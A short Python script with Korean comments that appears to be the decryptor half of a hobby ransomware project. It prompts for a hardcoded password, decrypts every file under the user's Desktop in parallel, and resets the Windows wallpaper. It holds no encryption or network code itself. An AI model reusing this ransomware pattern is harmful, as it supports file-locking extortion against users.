import AEScipher
from os import system,walk
#유저의 login name을 return 해주는 함수
from getpass import getuser
from ctypes import windll
from time import sleep
from multiprocessing import Pool, cpu_count

def SendForDeception(filename):		
    try:
            a.decrypt_file(filename)
            print(filename+"=success decryption.")
            
    except (PermissionError, ValueError):
        pass
    
userPath='/Users/name/Desktop'.replace('name',getuser())

key="김건욱"
a=AEScipher.AEScipher(key)

        

if __name__=='__main__':
    while True:
        if key==input("풀려면 비밀번호를 맞추세요: "):
            print("비밀번호가 맞았습니다.")
            break;
        else:
            print("비밀번호가 틀렸습니다.\n")
        
    #파일명을 모두 뽑아온다.   
    filelist=[]
    for (path, dir, files) in walk(userPath):
        for filename in files:
            filelist.append(path+'/'+filename)

    #cpu 코어 개수만큼 프로세스를 만든다.		
    process=Pool(cpu_count())

    #SendForException 함수에 들어갈 인자를 맵핑 시킨다.
    process.map(SendForDeception,tuple(filelist))

    print("\nAll file is success decrypted.\n"
      "Good bye. soohyuk")

    #자원 낭비를 방지하기 위해 close 호출 및 작업 완료 대기를  위해 join 함수 호출
    process.close()
    process.join()
    
    windll.user32.SystemParametersInfoW(20, 0, None , 0)
    sleep(3)
    #system("ipconfig/renew")
    



